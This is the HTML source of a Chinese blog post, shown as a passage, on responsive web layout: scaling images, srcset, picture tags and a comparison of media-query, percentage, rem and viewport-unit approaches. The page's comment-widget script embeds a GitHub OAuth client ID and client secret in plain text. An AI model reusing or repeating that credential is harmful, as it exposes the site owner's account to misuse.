<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>img {
    display: inline-block;
    max-width: 100%;
    height: auto;
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>inline-block<span class="nt">&lt;/code&gt;</span> 元素相对于它周围的内容以内联形式呈现，但与内联不同的是，这种情况下我们可以设置宽度和高度。 <span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>max-width<span class="nt">&lt;/code&gt;</span>保证了图片能够随着容器的进行等宽扩充（即保证所有图片最大显示为其自身的 100%。此时，如果包含图片的元素比图片固有宽度小，图片会缩放占满最大可用空间），而<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>height<span class="nt">&lt;/code&gt;</span>为<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>auto<span class="nt">&lt;/code&gt;</span>可以保证图片进行等比缩放而不至于失真。如果是背景图片的话要灵活运用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>background-size<span class="nt">&lt;/code&gt;</span>属性。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>那么为什么不能用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width：100%<span class="nt">&lt;/code&gt;</span>呢？因为这条规则会导致它显示得跟它的容器一样宽。在容器比图片宽得多的情况下，图片会被无谓地拉伸。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h5</span> <span class="na">id=</span><span class="s">"2使用srcset"</span><span class="nt">&gt;</span>2.使用srcset<span class="nt">&lt;/h5&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span><span class="ni">&amp;lt;</span>img srcset="photo_w350.jpg 1x, photo_w640.jpg 2x" src="photo_w350.jpg" alt=""<span class="ni">&amp;gt;</span>
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;</span>如果屏幕的dpi = 1的话则加载1倍图，而dpi = 2则加载2倍图，手机和mac基本上dpi都达到了2以上，这样子对于普通屏幕来说不会浪费流量，而对于视网膜屏来说又有高清的体验。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>如果浏览器不支持<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>srcset<span class="nt">&lt;/code&gt;</span>，则默认加载src里面的图片。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>但是你会发现实际情况并不是如此，在Mac上的Chrome它会同时加载<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>srcset<span class="nt">&lt;/code&gt;</span>里面的那张2x的，还会再去加载src里面的那张，加载两张图片。顺序是先把所有<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>srcset<span class="nt">&lt;/code&gt;</span>里面的加载完了，再去加载src的。这个策略比较奇怪，它居然会加载两张图片，如果不写src，则不会加载两张，但是兼容性就没那么好。这个可能是因为浏览器认为，既然有<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>srcset<span class="nt">&lt;/code&gt;</span>就不用写src了，如果写了src，用户可能是有用的。而使用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>picture<span class="nt">&lt;/code&gt;</span>就不会加载两张<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h5</span> <span class="na">id=</span><span class="s">"3使用background-image"</span><span class="nt">&gt;</span>3.使用background-image<span class="nt">&lt;/h5&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>.banner{
  background-image: url(/static/large.jpg);
}

@media screen and (max-width: 767px){
  background-image: url(/static/small.jpg);
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h5</span> <span class="na">id=</span><span class="s">"4使用picture标签"</span><span class="nt">&gt;</span>4.使用picture标签<span class="nt">&lt;/h5&gt;</span>

<span class="nt">&lt;p&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://link.juejin.im/?target=https%3A%2F%2Fscottjehl.github.io%2Fpicturefill%2F"</span><span class="nt">&gt;</span>picturefill.min.js<span class="nt">&lt;/a&gt;</span> ：解决IE等浏览器不支持 的问题<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span><span class="ni">&amp;lt;</span>picture<span class="ni">&amp;gt;</span>
    <span class="ni">&amp;lt;</span>source srcset="banner_w1000.jpg" media="(min-width: 801px)"<span class="ni">&amp;gt;</span>
    <span class="ni">&amp;lt;</span>source srcset="banner_w800.jpg" media="(max-width: 800px)"<span class="ni">&amp;gt;</span>
    <span class="ni">&amp;lt;</span>img src="banner_w800.jpg" alt=""<span class="ni">&amp;gt;</span>
<span class="ni">&amp;lt;</span>/picture<span class="ni">&amp;gt;</span>

<span class="ni">&amp;lt;</span>!-- picturefill.min.js 解决IE等浏览器不支持 <span class="ni">&amp;lt;</span>picture<span class="ni">&amp;gt;</span> 的问题 --<span class="ni">&amp;gt;</span>
<span class="ni">&amp;lt;</span>script type="text/javascript" src="js/vendor/picturefill.min.js"<span class="ni">&amp;gt;&amp;lt;</span>/script<span class="ni">&amp;gt;</span>
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>picture<span class="nt">&lt;/code&gt;</span>必须要写img标签，否则无法显示，对<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>pictur<span class="nt">&lt;/code&gt;</span>e的操作最后都是在img上面，例如onload事件是在img标签触发的，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>picture<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>source<span class="nt">&lt;/code&gt;</span>是不会进行layout的，它们的宽和高都是0。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>另外使用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>source<span class="nt">&lt;/code&gt;</span>，还可以对图片格式做一些兼容处理：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span><span class="ni">&amp;lt;</span>picture<span class="ni">&amp;gt;</span>
    <span class="ni">&amp;lt;</span>source type="image/webp" srcset="banner.webp"<span class="ni">&amp;gt;</span>
    <span class="ni">&amp;lt;</span>img src="banner.jpg" alt=""<span class="ni">&amp;gt;</span>
<span class="ni">&amp;lt;</span>/picture<span class="ni">&amp;gt;</span>
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>总结<span class="nt">&lt;/strong&gt;</span>：响应式布局的实现可以通过媒体查询+<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>px<span class="nt">&lt;/code&gt;</span>,媒体查询+百分比，媒体查询+<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>+<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>js<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vm/vh<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vm/vh<span class="nt">&lt;/code&gt;</span> +<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>这几种方式来实现。但每一种方式都是有缺点的，媒体查询需要选取主流设备宽度尺寸作为断点针对性写额外的样式进行适配，但这样做会比较麻烦，只能在选取的几个主流设备尺寸下呈现完美适配，另外用户体验也不友好，布局在响应断点范围内的分辨率下维持不变，而在响应断点切换的瞬间，布局带来断层式的切换变化，如同卡带的唱机般“咔咔咔”地一下又一下。通过百分比来适配首先是计算麻烦，第二各个属性中如果使用百分比，其相对的元素的属性并不是唯一的，这样就造成我们使用百分比单位容易使布局问题变得复杂。通过采用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>单位的动态计算的弹性布局，则是需要在头部内嵌一段脚本来进行监听分辨率的变化来动态改变根元素字体大小，使得<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>CSS<span class="nt">&lt;/code&gt;</span>与<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>JS<span class="nt">&lt;/code&gt;</span> 耦合了在一起。通过利用纯<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>css<span class="nt">&lt;/code&gt;</span>视口单位实现适配的页面，是既能解决响应式断层问题，又能解决脚本依赖的问题的，但是兼容性还没有完全能结构接受。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"响应式布局的成型方案"</span><span class="nt">&gt;</span>响应式布局的成型方案<span class="nt">&lt;/h2&gt;</span>

<span class="nt">&lt;p&gt;</span>现在的css，UI框架等都已经考虑到了适配不同屏幕分辨率的问题，实际项目中我们可以直接使用这些新特性和框架来实现响应式布局。可以有以下选择方案：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;ul&gt;</span>
  <span class="nt">&lt;li&gt;</span>利用上面的方法自己来实现，比如CSS3 Media Query,rem，vw等<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>Flex弹性布局，兼容性较差<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>Grid网格布局，兼容性较差<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>Columns栅格系统，往往需要依赖某个UI库，如Bootstrap<span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ul&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"响应式布局的要点"</span><span class="nt">&gt;</span>响应式布局的要点<span class="nt">&lt;/h2&gt;</span>

<span class="nt">&lt;p&gt;</span>在实际项目中，我们可能需要综合上面的方案，比如用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>来做字体的适配，用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>srcset<span class="nt">&lt;/code&gt;</span>来做图片的响应式，宽度可以用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>flex<span class="nt">&lt;/code&gt;</span>，栅格系统等来实现响应式，然后可能还需要利用媒体查询来作为响应式布局的基础，因此综合上面的实现方案，项目中实现响应式布局需要注意下面几点：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;ul&gt;</span>
  <span class="nt">&lt;li&gt;</span>设置viewport<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>媒体查询<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>字体的适配（字体单位）<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>百分比布局<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>图片的适配（图片的响应式）<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>结合flex，grid，BFC，栅格系统等已经成型的方案<span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ul&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>参考文章：<span class="nt">&lt;/strong&gt;&lt;/p&gt;</span>

<span class="nt">&lt;ol&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://juejin.im/post/6844903630655471624#heading-0"</span><span class="nt">&gt;</span>响应式布局的常用解决方案对比(媒体查询、百分比、rem和vw/vh）<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://caibaojian.com/vw-vh.html"</span><span class="nt">&gt;</span>纯CSS3使用vw和vh视口单位实现自适应<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://juejin.im/post/6844903654323929096#heading-9"</span><span class="nt">&gt;</span>你真的了解响应式布局吗？<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://www.ghugo.com/mobile-h5-fluid-layout-for-iphone6/"</span><span class="nt">&gt;</span>移动端H5页面 iphone6的适配技巧<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://juejin.im/post/6844903479681499150"</span><span class="nt">&gt;</span>响应式开发心得<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://juejin.im/post/6844903513651150856#heading-10"</span><span class="nt">&gt;</span>详解前端响应式布局、响应式图片，与自制栅格系统<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://juejin.im/post/6844903648099565576"</span><span class="nt">&gt;</span>基于媒体查询和 rem 的响应式布局实践<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://www.cnblogs.com/lyzg/p/4877277.html"</span><span class="nt">&gt;</span>从网易与淘宝的font-size思考前端设计稿与工作流<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://www.vsoui.com/2017/03/15/mobile-FE-Adaptive/"</span><span class="nt">&gt;</span>移动端前端适配方案对比<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
<span class="nt">&lt;/ol&gt;</span>

<span class="nt">&lt;p&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://juejin.im/post/6844903814332432397"</span><span class="nt">&gt;</span>Link<span class="nt">&lt;/a&gt;&lt;/p&gt;</span>



                <span class="nt">&lt;hr</span> <span class="na">style=</span><span class="s">"visibility: hidden;"</span><span class="nt">&gt;</span>

                <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"pager"</span><span class="nt">&gt;</span>
                    
                    <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"previous"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/2020/10/11/%E5%88%9D%E4%B8%AD%E7%BA%A7%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98/"</span> <span class="na">data-toggle=</span><span class="s">"tooltip"</span> <span class="na">data-placement=</span><span class="s">"top"</span> <span class="na">title=</span><span class="s">"初中级前端面试题"</span><span class="nt">&gt;</span>
                        Previous<span class="nt">&lt;br&gt;</span>
                        <span class="nt">&lt;span&gt;</span>初中级前端面试题<span class="nt">&lt;/span&gt;</span>
                        <span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/li&gt;</span>
                    
                    
                    <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"next"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/2020/10/12/javascript%E7%9A%84setTimeout()%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93-js%E7%9A%84setTimeout()%E6%96%B9%E6%B3%95/"</span> <span class="na">data-toggle=</span><span class="s">"tooltip"</span> <span class="na">data-placement=</span><span class="s">"top"</span> <span class="na">title=</span><span class="s">"前端安全系列（一）如何防止XSS攻击"</span><span class="nt">&gt;</span>
                        Next<span class="nt">&lt;br&gt;</span>
                        <span class="nt">&lt;span&gt;</span>前端安全系列（一）如何防止XSS攻击<span class="nt">&lt;/span&gt;</span>
                        <span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/li&gt;</span>
                    
                <span class="nt">&lt;/ul&gt;</span>


                <span class="c">&lt;!--Gitalk评论start  --&gt;</span>
                
                <span class="c">&lt;!-- 引入Gitalk评论插件  --&gt;</span>
                <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"https://unpkg.com/gitalk/dist/gitalk.css"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://unpkg.com/gitalk@latest/dist/gitalk.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"gitalk-container"</span><span class="nt">&gt;&lt;/div&gt;</span>
                <span class="c">&lt;!-- 引入一个生产md5的js，用于对id值进行处理，防止其过长 --&gt;</span>
                <span class="c">&lt;!-- Thank DF:https://github.com/NSDingFan/NSDingFan.github.io/issues/3#issuecomment-407496538 --&gt;</span>
                <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/js/md5.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
                <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
                    <span class="kd">var</span> <span class="nx">gitalk</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Gitalk</span><span class="p">({</span>
                    <span class="na">clientID</span><span class="p">:</span> <span class="dl">'</span><span class="s1">b070bb95e57a3650e202</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">clientSecret</span><span class="p">:</span> <span class="dl">'</span><span class="s1">8420656a991994ea4aa65c2249b6583d6a4c4c54</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">repo</span><span class="p">:</span> <span class="dl">'</span><span class="s1">tian-guo-guo.github.io</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">owner</span><span class="p">:</span> <span class="dl">'</span><span class="s1">tian-guo-guo</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">admin</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">tian-guo-guo</span><span class="dl">'</span><span class="p">],</span>
                    <span class="na">distractionFreeMode</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
                    <span class="na">id</span><span class="p">:</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">pathname</span><span class="p">),</span>
                    <span class="p">});</span>
                    <span class="nx">gitalk</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">gitalk-container</span><span class="dl">'</span><span class="p">);</span>
                <span class="nt">&lt;/script&gt;</span>
                
                <span class="c">&lt;!-- Gitalk end --&gt;</span>

                

            <span class="nt">&lt;/div&gt;</span>  

    <span class="c">&lt;!-- Side Catalog Container --&gt;</span>
        
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"
                col-lg-2 col-lg-offset-0
                visible-lg-block
                sidebar-container
                catalog-container"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"side-catalog"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;hr</span> <span class="na">class=</span><span class="s">"hidden-sm hidden-xs"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;h5&gt;</span>
                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"catalog-toggle"</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>CATALOG<span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/h5&gt;</span>
                    <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"catalog-body"</span><span class="nt">&gt;&lt;/ul&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        

    <span class="c">&lt;!-- Sidebar Container --&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                sidebar-container"</span><span class="nt">&gt;</span>

                <span class="c">&lt;!-- Featured Tags --&gt;</span>
                
                <span class="nt">&lt;section&gt;</span>
                    <span class="nt">&lt;hr</span> <span class="na">class=</span><span class="s">"hidden-sm hidden-xs"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;h5&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/tags/"</span><span class="nt">&gt;</span>FEATURED TAGS<span class="nt">&lt;/a&gt;&lt;/h5&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"tags"</span><span class="nt">&gt;</span>
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#技术"</span> <span class="na">title=</span><span class="s">"技术"</span> <span class="na">rel=</span><span class="s">"50"</span><span class="nt">&gt;</span>
                                    技术
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#python"</span> <span class="na">title=</span><span class="s">"python"</span> <span class="na">rel=</span><span class="s">"102"</span><span class="nt">&gt;</span>
                                    python
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#nlp"</span> <span class="na">title=</span><span class="s">"nlp"</span> <span class="na">rel=</span><span class="s">"59"</span><span class="nt">&gt;</span>
                                    nlp
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#paper"</span> <span class="na">title=</span><span class="s">"paper"</span> <span class="na">rel=</span><span class="s">"60"</span><span class="nt">&gt;</span>
                                    paper
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#机器翻译"</span> <span class="na">title=</span><span class="s">"机器翻译"</span> <span class="na">rel=</span><span class="s">"57"</span><span class="nt">&gt;</span>
                                    机器翻译
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#专利"</span> <span class="na">title=</span><span class="s">"专利"</span> <span class="na">rel=</span><span class="s">"17"</span><span class="nt">&gt;</span>
                                    专利
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#新能源"</span> <span class="na">title=</span><span class="s">"新能源"</span> <span class="na">rel=</span><span class="s">"6"</span><span class="nt">&gt;</span>
                                    新能源
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#pytorch"</span> <span class="na">title=</span><span class="s">"pytorch"</span> <span class="na">rel=</span><span class="s">"9"</span><span class="nt">&gt;</span>
                                    pytorch
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#学习日记"</span> <span class="na">title=</span><span class="s">"学习日记"</span> <span class="na">rel=</span><span class="s">"39"</span><span class="nt">&gt;</span>
                                    学习日记
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#github"</span> <span class="na">title=</span><span class="s">"github"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    github
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#numpy"</span> <span class="na">title=</span><span class="s">"numpy"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    numpy
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#娱乐"</span> <span class="na">title=</span><span class="s">"娱乐"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    娱乐
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#钢琴"</span> <span class="na">title=</span><span class="s">"钢琴"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    钢琴
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#读书笔记"</span> <span class="na">title=</span><span class="s">"读书笔记"</span> <span class="na">rel=</span><span class="s">"14"</span><span class="nt">&gt;</span>
                                    读书笔记
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#道德经"</span> <span class="na">title=</span><span class="s">"道德经"</span> <span class="na">rel=</span><span class="s">"7"</span><span class="nt">&gt;</span>
                                    道德经
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#迁移学习"</span> <span class="na">title=</span><span class="s">"迁移学习"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    迁移学习
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#硅谷来信"</span> <span class="na">title=</span><span class="s">"硅谷来信"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    硅谷来信
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#爬虫"</span> <span class="na">title=</span><span class="s">"爬虫"</span> <span class="na">rel=</span><span class="s">"6"</span><span class="nt">&gt;</span>
                                    爬虫
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#服务器"</span> <span class="na">title=</span><span class="s">"服务器"</span> <span class="na">rel=</span><span class="s">"22"</span><span class="nt">&gt;</span>
                                    服务器
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#算法"</span> <span class="na">title=</span><span class="s">"算法"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    算法
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
